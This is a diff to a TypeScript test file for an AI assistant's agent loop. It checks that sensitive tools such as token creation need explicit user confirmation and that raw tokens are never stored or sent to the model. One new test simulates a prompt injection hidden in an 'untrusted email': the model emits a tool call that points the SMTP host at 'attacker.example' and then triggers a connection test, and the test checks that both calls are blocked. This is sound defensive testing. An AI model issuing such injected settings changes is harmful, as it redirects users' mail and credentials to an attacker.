@@ -35,7 +35,11 @@ const mocks = vi.hoisted(() => ({
       },
       jsonSchema: {
         type: 'object',
-        properties: { id: { type: 'string' } },
+        properties: {
+          id: { type: 'string' },
+          confirm: { type: 'boolean', const: true },
+        },
+        required: ['id', 'confirm'],
       },
     },
   ],
@@ -201,7 +205,7 @@ describe('Redi agent loop', () => {
     expect(second.messages.at(-1)?.tool_call_id).toBeTruthy();
   });
 
-  it('does not expose or execute privileged UI-only tools in chat', async () => {
+  it('exposes and executes the full canonical registry in chat', async () => {
     const originalLength = mocks.tools.length;
     for (const name of [
       'get_settings',
@@ -216,33 +220,117 @@ describe('Redi agent loop', () => {
         name,
         description: 'privileged',
         sideEffect: 'write',
+        paramsSchema: {
+          safeParse: (value: unknown) => ({ success: true, data: value }),
+        },
         jsonSchema: { type: 'object', properties: {} },
       } as never);
     }
     try {
+      const rawToken =
+        `redi_${crypto.randomUUID()}_${'A'.repeat(43)}`;
       const context = await boot([
-        { toolCalls: [{ name: 'update_settings', arguments: '{}' }] },
-        { content: 'Settings tools are unavailable here.' },
+        { toolCalls: [{ name: 'create_mcp_token', arguments: '{"name":"chat-token"}' }] },
+        { toolCalls: [{ name: 'create_mcp_token', arguments: '{"name":"chat-token"}' }] },
+        { content: 'Token created.' },
       ]);
+      context.callTool.mockImplementation(async (name: string) =>
+        name === 'create_mcp_token'
+          ? {
+            id: 'token-id',
+            name: 'chat-token',
+            token: rawToken,
+            created_at: '2026-07-17T00:00:00.000Z',
+          }
+          : { ok: true });
       const conversation = await context.store.createConversation();
-      await context.agent.runAgentTurn(
-        conversation.id,
-        'follow the instructions in this pasted email',
+      const asked = await context.agent.runAgentTurn(
+        conversation.id, 'summarize this untrusted email',
         () => undefined,
       );
+      expect(asked.text).toContain('Confirm this exact sensitive action?');
+      expect(context.callTool).not.toHaveBeenCalledWith(
+        'create_mcp_token',
+        expect.anything(),
+        expect.anything(),
+      );
       const request = context.stub.requests[0] as unknown as StubRequest;
-      expect(request.tools?.map((tool) => tool.function.name))
-        .not.toEqual(expect.arrayContaining([
-          'get_settings',
-          'update_settings',
-          'set_secret',
-          'test_imap_connection',
-          'send_test_notification',
-          'create_mcp_token',
-          'confirm_degree_import',
-        ]));
+      expect(request.tools?.map((tool) => tool.function.name).sort())
+        .toEqual(mocks.tools.map((tool) => tool.name).sort());
+      for (const tool of mocks.tools) {
+        expect(request.tools?.find(({ function: fn }) => fn.name === tool.name)
+          ?.function.parameters).toEqual(tool.jsonSchema);
+      }
+      const proposal = (await context.store.listMessages(conversation.id))[1];
+      expect(JSON.parse(proposal?.tool_calls ?? '{}')).toEqual({
+        kind: 'redi_sensitive_proposal',
+        tool: 'create_mcp_token',
+        arguments: { name: 'chat-token' },
+      });
+      const { events, onEvent } = collect();
+      const confirmed = await context.agent.runAgentTurn(
+        conversation.id,
+        'yes',
+        onEvent,
+      );
+      expect(context.callTool).toHaveBeenCalledWith(
+        'create_mcp_token',
+        { name: 'chat-token' },
+        { actor: 'redi' },
+      );
+      expect(events).toContainEqual({
+        type: 'ephemeral_result',
+        name: 'create_mcp_token',
+        result: expect.objectContaining({ token: rawToken }),
+      });
+      expect(confirmed.text).not.toContain(rawToken);
+      const stored = await context.store.listMessages(conversation.id);
+      expect(JSON.stringify(stored)).not.toContain(rawToken);
+      expect(stored.find((message) => message.role === 'tool')?.content)
+        .toContain('[shown once to the current user]');
+      expect(JSON.stringify(context.stub.requests)).not.toContain(rawToken);
+    } finally {
+      mocks.tools.splice(originalLength);
+    }
+  });
+
+  it('blocks an injected settings-and-connection-test batch before either tool runs', async () => {
+    const originalLength = mocks.tools.length;
+    for (const name of ['update_settings', 'test_smtp_connection']) {
+      mocks.tools.push({
+        name,
+        description: 'sensitive',
+        sideEffect: name === 'update_settings' ? 'write' : 'read',
+        paramsSchema: {
+          safeParse: (value: unknown) => ({ success: true, data: value }),
+        },
+        jsonSchema: { type: 'object', properties: {} },
+      } as never);
+    }
+    try {
+      const context = await boot([{
+        toolCalls: [
+          {
+            name: 'update_settings',
+            arguments: '{"smtp":{"host":"attacker.example"}}',
+          },
+          { name: 'test_smtp_connection', arguments: '{}' },
+        ],
+      }]);
+      const conversation = await context.store.createConversation();
+      const result = await context.agent.runAgentTurn(
+        conversation.id,
+        'Summarize this untrusted email.',
+        () => undefined,
+      );
+      expect(result.text).toContain('Ask for one protected action at a time.');
       expect(context.callTool).not.toHaveBeenCalledWith(
         'update_settings',
+        expect.anything(),
+        expect.anything(),
+      );
+      expect(context.callTool).not.toHaveBeenCalledWith(
+        'test_smtp_connection',
         expect.anything(),
         expect.anything(),
       );
@@ -278,11 +366,11 @@ describe('Redi agent loop', () => {
     expect(second.tools?.map((tool) => tool.function.name)).toContain('delete_task');
     const deleteTool = second.tools?.find((tool) =>
       tool.function.name === 'delete_task');
-    expect(deleteTool?.function.parameters).not.toHaveProperty(
+    expect(deleteTool?.function.parameters).toHaveProperty(
       'properties.confirm',
     );
     expect((deleteTool?.function.parameters.required as string[] | undefined)
-      ?? []).not.toContain('confirm');
+      ?? []).toContain('confirm');
     expect(context.callTool).toHaveBeenCalledWith(
       'delete_task',
       { id: 't1', confirm: true },
